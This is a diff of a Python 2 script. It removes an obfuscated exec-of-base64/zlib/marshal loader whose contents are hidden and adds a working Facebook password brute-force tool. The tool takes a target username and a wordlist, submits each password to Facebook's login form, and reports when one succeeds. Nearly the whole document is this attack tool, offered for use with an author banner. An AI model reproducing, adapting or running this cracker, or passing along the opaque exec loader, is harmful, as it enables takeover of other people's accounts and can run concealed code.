@@ -1,2 +1,83 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#Name:Cyber ALAMiN
+#github (https://github.com/Cyber-ALAMiN)
+#Cyber-ALAMiN
+
+import time
+import os
+
+os.system('clear')
+time.sleep(0.5)
+try:
+    import mechanize
+except ModuleNotFoundError:
+    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
+    exit()
+os.system("clear")
+print """
+\033[1;31m     █████╗ ██╗      █████╗ ███╗   ███╗██╗███╗   ██╗
+\033[1;31m    ██╔══██╗██║     ██╔══██╗████╗ ████║██║████╗  ██║
+\033[1;31m    ███████║██║     ███████║██╔████╔██║██║██╔██╗ ██║
+\033[1;31m    ██╔══██║██║     ██╔══██║██║╚██╔╝██║██║██║╚██╗██║
+\033[1;31m    ██║  ██║███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║
+\033[1;31m    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
+\033[1;97m           [⚡\033[1;97mAuthor Name: Cyber ALAMiN     ⚡\033[1;97m]
+\033[1;97m           [⚡\033[1;97mPhone Numbr: +8801701408009   ⚡\033[1;97m]
+\033[1;97m           [⚡\033[1;97mYutube Chnl: Cyber ALAMiN     ⚡\033[1;97m]
+\033[1;97m           [⚡       \033[1;97mFrom: Bangladesh 🇧🇩    ⚡\033[1;97m]
+
+\033[1;47m\033[1;35m          Enter Facebook Account User Name:⤵️                 \033[1;0m
+"""    
+time.sleep(0.5)
+user = raw_input('[+] Target Username/ID/Email : ')
+time.sleep(0.8)
+wrdlstFileName = raw_input('\n[+] Enter Wordlist Directory : ')
+try:
+    wordlist = open(wrdlstFileName, 'r')
+except FileNotFoundError:
+    print ('\n[!] File Not Found!')
+    exit()
+
+time.sleep(0.8)
+print '\n\nCracking '+user+' Now...'
+
+time.sleep(1)
+print '\033[1;47m\033[1;31m               Cracking Has Been Started                   \033[1;0m   '
+for password in wordlist:
+    if password == '' or password == ' ':
+        pass
+    else:
+        try:
+            browser = mechanize.Browser()
+            browser.set_handle_robots(False)
+            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
+            fb = browser.open('https://facebook.com')
+            dos = open('Facebook-Log.txt', 'w+')
+            browser.select_form(nr=0)
+            browser.form['email'] = user
+            browser.form['pass'] = password
+            browser.method = 'POST'
+            browser.submit()
+            dos.write(browser.open('https://facebook.com').read())
+            dos.seek(0)
+            text = dos.read().decode('UTF-8')
+            if text.find('home_icon', 0, len(text)) != -1:
+                print '\033[1;97m[+] \033[1;31mPassword Match : '+password 
+                dos.close()
+                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
+                exit()
+            else:
+                print "\033[1;97m[+] \033[1;32mWrong Password : "+str(password)
+        except KeyboardInterrupt:
+            print '\n#############################################\n   Exiting..'
+            dos.close()
+            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
+            exit()
+
+time.sleep(1)
+print 'Sorry, none of the passswords in your wordlist is right.'
+time.sleep(0.8)
+dos.close()
+os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
+exit()
